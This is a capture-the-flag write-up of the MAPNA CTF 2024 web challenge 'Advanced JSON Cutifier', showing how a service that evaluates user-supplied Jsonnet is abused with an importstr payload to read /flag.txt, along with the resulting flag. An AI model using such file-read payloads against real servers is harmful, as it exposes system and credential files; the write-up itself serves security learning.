---
title: MAPNACTF 2024 - Advanced JSON Cutifier
description: Writeup for Advanced JSON Cutifier web challenge
date: 2024-01-20
tldr: An intriguing challenge involving Jsonnet and file imports. Can we exploit it to read arbitrary files?
draft: false
tags: ["ctf", "writeup", "Web"]
---

# Advanced JSON Cutifier
This challenge involved an application using Jsonnet, a data templating language for app and tool developers. It allows us to import files, which was the key to solving the challenge.

## Initial Analysis

Upon examining the challenge, we encountered a runtime error indicating a problem with importing the "os" module in Jsonnet. The error message was as follows:

```
RUNTIME ERROR: couldn't open import "os": no match locally or in the Jsonnet library paths
    ctf:1:12-23    object <anonymous>
    Field "kokot"    
    During manifestation    
```

This was a crucial hint that led us to explore the import functionality of Jsonnet further.

## Exploiting the Import Functionality

Jsonnet's documentation on GitHub (https://github.com/google/go-jsonnet) suggests that it allows the importing of files. This capability can be misused to read arbitrary files on the server. We used the following Jsonnet code to attempt to read the flag:

```jsonnet
{"wow so advanced!!": importstr '/flag.txt'}
```

## Getting the Flag

Upon running the above Jsonnet code, we successfully retrieved the flag:

```
{
   "wow so advanced!!": "MAPNA{5uch-4-u53ful-f347ur3-a23f98d}\n\n"
}
```

The flag `MAPNA{5uch-4-u53ful-f347ur3-a23f98d}` was obtained by exploiting the file import capability in Jsonnet, demonstrating an interesting file read vulnerability.

## Conclusion

This challenge highlighted the importance of understanding the functionalities of various programming languages and libraries, especially in terms of security implications. The ability to import files in Jsonnet, while useful, can be exploited in unintended ways, as demonstrated in this challenge.
